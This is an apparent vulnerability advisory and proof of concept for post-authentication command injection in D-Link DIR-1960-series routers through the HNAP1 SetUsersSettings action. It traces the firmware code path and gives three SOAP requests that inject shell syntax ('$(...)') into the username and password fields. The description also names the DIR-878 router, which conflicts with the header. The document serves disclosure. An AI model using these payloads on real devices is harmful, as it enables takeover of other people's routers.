# D-Link DIR-1960 : HNAP1 SetUsersSettings Post-Authenticated Command Injection

## Affected Software

Device : **D-Link DIR-1960, DIR-1360, DIR-2260 & DIR-3060**

Firmware: **1.11B03 Hotfix** **1.30**

Endpoint: http://purenetworks.com/HNAP1/

## Description of the vulnerability
This vulnerability is present as there are no checks on user input taken from the SetUsersSettings action, which is passed to `twsystem`, allowing an attacker to execute arbitary code on the affected installations of the D-Link DIR-878 router.

## Technical Details

### HNAP1

D-Link uses the HNAP1 (Home Network Administration Protocol) which is a SOAP-based protocol. It can be accessed through the http://purenetworks.com/HNAP1/ with a SOAPAction HTTP header to specify the desired operation. **/bin/prog.cgi** is responsible for receiving the incoming requests, and saves the user-given parameters into nvram after processing them. On the other hand, **/bin/rc** reads from nvram then performs the operation that is requested by the user.

**/bin/rc** spawns a UDP server at port 6789, which is used by **/bin/prog.cgi** to notify it whenever there is request made by the user.

### Vulnerability

#### /bin/prog.cgi receives the request

In the **/bin/prog.cgi** binary, at the `SetUsersSettings` handler (0x498308), the parameters `UserName` and `Password` are read from the XML data in the request body, saved into nvram as `USB_Account%d_Username` and `USB_Account%d_Password`, where `%d` is the index of the user parameter (multiple users' information are provided through one request). In particular, after `SetUsersSettings` reads the parameters from the request body, they are stored in memory, and passed to a function at 0x497af4 to save them into nvram.

After this, two more requests need to be made:

1. `SetSMBStatus` to enable SMB
2. `SetFTPSettings` to trigger the vulnerable code path in **/bin/rc** by calling `serviceApply(local_20,0x2b)`:

```c
case 0x2b:
    notify_rc("restart_usb_service");
    break;
```

#### /bin/rc handles the request

Inside `handle_notifications`, the `restart_usb_service` string leads to the followinga call to the function at 0x44e094, which calls 0x451080.

```c
cmp = strcmp(local_1d8,usb_service");
// mode == 3 when the notification starts withrestart_"
if (cmp == 0) {
    if ((mode & 1) != 0) {
        FUN_0044e064();
    }
    if ((mode & 2) != 0) {
        FUN_0044e094();
    }
}
```

Inside 0x451080, the program first checks if SMB is enabled. This is done by `SetSMBStatus` as mentioned earlier. Then, it checks if at least one of **/tmp/usbdisk0**, **/tmp/usbdisk1** or **/tmp/usbdisk2** exists. Unfortunately, these files are only created when a USB device is plugged into the router.

If the check is satisfied, it will call the vulnerable function at 0x450ce0. The function loads `USB_Account%d_UserName` and `USB_Account%d_Password` from nvram, and passes them into `twsystem`.

```c
snprintf(cmd, 0x200,( echo \"%s\"; echo \"%s\" ) | smbpasswd -c %s -s -a %s",
        password, password,/etc/smb.conf", username);
twsystem(cmd, 1);
```

An attacker can provide malicious values for the username and password strings to perform a command injection attack.

## Exploit

After authenticating, send the following SOAP requests to http://purenetworks.com/HNAP1/.

### Enable SMB

```xml
Content-Type: text/xml; charset=utf-8
SOAPAction: http://purenetworks.com/HNAP1/SetSMBStatus

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <SetSMBStatus xmlns="http://purenetworks.com/HNAP1/">
            <Enabled>true</Enabled>
        </SetSMBStatus>
    </soap:Body>
</soap:Envelope>
```

### To store the malicious values into nvram

```xml
Content-Type: text/xml; charset=utf-8
SOAPAction: http://purenetworks.com/HNAP1/SetUsersSettings

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <SetUsersSettings xmlns="http://purenetworks.com/HNAP1/">
            <StorageUsersLists>
                <StorageUser>
                    <UserName>user1</UserName>
                    <Password>password1</Password>
                    <Enabled>true</Enabled>
                    <ServiceInfoLists>
                        <ServiceInfo>
                            <ServiceName>SAMBA</ServiceName>
                            <Enabled>true</Enabled>
                            <AccessPath>/</AccessPath>
                            <Permission>true</Permission>
                        </ServiceInfo>
                    </ServiceInfoLists>
                </StorageUser>
                <StorageUser>
                    <UserName>user$(echo gg>/tmp/gg)</UserName>
                    <Password>password$(echo gg>/tmp/gg)</Password>
                    <Enabled>true</Enabled>
                    <ServiceInfoLists>
                        <ServiceInfo>
                            <ServiceName>SAMBA</ServiceName>
                            <Enabled>true</Enabled>
                            <AccessPath>/</AccessPath>
                            <Permission>true</Permission>
                        </ServiceInfo>
                    </ServiceInfoLists>
                </StorageUser>
            </StorageUsersLists>
        </SetUsersSettings>
    </soap:Body>
</soap:Envelope>
```

### To trigger the vulnerable code path

```xml
Content-Type: text/xml; charset=utf-8
SOAPAction: http://purenetworks.com/HNAP1/SetFTPSettings

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <SetFTPSettings xmlns="http://purenetworks.com/HNAP1/">
            <Enabled>true</Enabled>
            <RemoteFTP>true</RemoteFTP>
            <FTPPort>21</FTPPort>
            <IdleTime>10000</IdleTime>
        </SetFTPSettings>
    </soap:Body>
</soap:Envelope>
```

### Usage

```
$ npm install
$ node app.js
```

Credits: https://github.com/bikerp/dsp-w215-hnap

## Timeline
20th July 2021 - First attempt to notify vendor

05th April 2022 - Second attempt to notify vendor

07th April 2022 - Third attempt to notify vendor

24th June 2022 - Fourth attempt to notify vendor

27th June 2022 - FundayFriday release